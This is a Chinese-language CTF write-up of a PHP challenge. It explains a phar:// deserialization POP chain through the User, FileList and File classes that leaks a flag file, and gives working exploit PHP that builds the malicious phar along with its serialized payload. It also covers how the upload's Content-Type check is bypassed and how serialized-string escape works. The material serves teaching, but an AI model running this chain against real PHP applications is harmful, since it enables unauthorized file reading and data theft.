
# PHP 反序列化与文件下载漏洞分析

首先该题包含`class.php`，然后出现两个函数：`ini_set()`用于设定指定选项的值，`getcwd()`用于获取当前的工作目录。接着实例化了一个`file`对象，并将`$filename`变量的值设置为`$_POST['filename']`的值。

然后有一个`if`判断：首先`filename`的长度不能超过`40`，并且`file`类中的`open()`方法可以对`filename`执行操作。然后用`stristr()`函数判断`filename`中是否有`flag`字符串，如果有则执行`echo "File not exist"`。因此，这个任意文件下载功能无法直接下载包含`flag`的文件。

## 攻击思路

1. 构造一个`FileLast`实例化的对象。
2. 让这个对象调用不存在的`close()`方法，从而触发`file`类中的`close()`方法。
3. 将`file`类中的`filename`属性的值设置为`flag`。

可以通过`phar://`协议实现第一步，实例化一个`FileLast`对象，但无法直接实现第二步，即让实例化的对象调用`close()`方法。

此时需要利用`POP链`，寻找其他地方调用`close()`方法的代码。在`class.php`中，`User`类中的`__destruct()`方法调用了一个`close()`方法：

```php
public function __destruct() {
    $this->db->close();
}
```

这个`User`类的`close()`方法中，有一个`db`属性，该属性是全局变量，用于连接`MySQL`的对象：

```php
$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);

class User {
    public $db;

    public function __construct() {
        global $db;
        $this->db = $db;
    }
    // PS:省略了大部分代码
}
```

这个流程是：当`User`类被销毁时，会关闭与`MySQL`的连接。恰巧`MySQL`关闭连接的方法也叫`close()`，而我们想要利用的方法也叫`close()`。如果我们将`db`属性替换为`file`对象，就可以实现目标。

构造`exp`如下：

```php
<?php

use User as GlobalUser;

class User{
    public $db;
    function __construct(){
        $this -> db = new FileList();
        // 将db变为FileList的对象，就等于是$this->new FileList->close() => File->close()
    }
}

class FileList {
    private $files;
    private $results;
    private $funcs;
    function __construct()
    {
        $this -> files = [new File('/flag')]; // 传入一个/flag给File类中
        $this -> results = [];
        $this -> funcs = [];
    }
}

class File {
    public $filename;
    function __construct($name)
    {
        $this -> filename = $name; // 将传入的/flag设置为filename
    }
}

$a = new User();
// 当我们将$a传入服务器的时候，销毁$a，然后就会执行class.php中User()的__destruct()方法
// 原本是调用db->close()，因为构造的exp，导致db->close()变成了FileList->close()
// 然后FileList中没有close方法，就会调用__call()方法，进而变为调用File的close()方法
// 因为exp的原因，$filename的值变为flag，调用file->close()方法的时候，就会读取/flag的内容

$phar = new Phar("exp.phar");
$phar -> startBuffering();
$phar -> setStub("<?php __HALT_COMPILER(); ?>");
$phar -> setMetadata($a);
$phar -> addFromString("exp.txt", "exp");
$phar -> stopBuffering();
// 利用phar，生成一个exp.phar包
```

生成一个`exp.phar`包，其中包含已经序列化过的`$a`的内容：

```
<?php __HALT_COMPILER(); ?>
&#00;&#00;&#00;&#00;&#00;&#00;&#00;&#00;&#00;&#00;&#00;&#00;&#00;&#00;&#00;&#00;&#00;O:4:"User":1:{s:2:"db";O:8:"FileList":3:{s:15:"&#00;FileList&#00;files";a:1:{i:0;O:4:"File":1:{s:8:"filename";s:5:"/flag";}}s:17:"&#00;FileList&#00;results";a:0:{}s:15:"&#00;FileList&#00;funcs";a:0:{}}} &#00;&#00;&#00;exp.txt&#00;&#00;&#00;b&#00;&#00;&#00;R&#00;&#00;&#00;&#00;&#00;&#00;exp9' U|+&#00;&#00;&#00;GBMB`
```

此题还提供了上传功能。将制作好的`exp.phar`上传到服务器，只需绕过`Content-Type`字段的内容即可上传成功。虽然后缀会被强制修改，但不影响文件本身的内容。

然后从下载功能处抓包，利用`phar://`协议进行利用。但发现利用后仍然不行（“哒咩”）。经过搜索，发现`flag`文件不是`flag`，而是`flag.txt`。

这道题除了这里，还有另一个限制，就是`download.php`的另一个设置：

```php
ini_set("open_basedir", getcwd() . ":/etc:/tmp");
```

我们只能读取当前文件夹、`etc`、`tmp`这三个文件夹中的内容。

但是还有一个重要的功能，即删除功能。将删除功能的代码也下载下来检查：

## 总结

首先，任意注册一个用户，然后利用上传文件功能上传一个文件（虽然后缀会被强制修改）。接着，利用下载功能将题目的PHP源码全部下载下来进行代码审计。利用`class.php`中的`FileList`类中的`__call()`方法和`File`类中的`close()`方法，为了构造`POP链`，还利用了`User`类中的`close()`方法，将原本的`db`数据库连接对象替换为`FileList`的对象，然后将`File`类中的`filename`属性替换为`flag.txt`来读取本题的`flag`文件。但由于下载功能点被限制了工作目录，所以需要更换功能点进行测试。

## PHP反序列化（字符串逃逸）

首先，我们观察这样一个经过序列化之后的字符串：

```
a:1:{i:0;s:3:"123";}???
```

从该字符串中可以得知：它是一个数组，数组中有一个键值为`int`型的`0`，`value`值是一个`str`型，长度为`3`的`123`。但是后面还有一串`???`，先不管它，将这一整串字符串进行反序列化。

执行PHP代码：

```php
<?php
print_r(unserialize('a:1:{i:0;s:3:"123";}???'));
```

得到回显：

```
Array
(
    [0] => 123
)
```

这是存在这三个`?`所得到的结果。此时将`?`都去掉，查看回显：

```
Array
(
    [0] => 123
)
```

发现回显并没有改变，有和没有结果一样。

也就是说，序列化一个字符串，序列化到其结束符之后，后续的内容不会进行序列化。

而`123`的内容是可控的，可以直接在`123`后面加上前一个序列化的结束符：

```
a:1:{i:0;s:3:"123";}";}
```

即输入的内容变为`123";}`，这会导致后面的字符串失效，即原来的`";}`无效了。

将这样一个字符串进行反序列化后，会发现与上面两个结果并无区别。

这里的**字符串逃逸**原理其实和`SQL注入`的原理差不多。
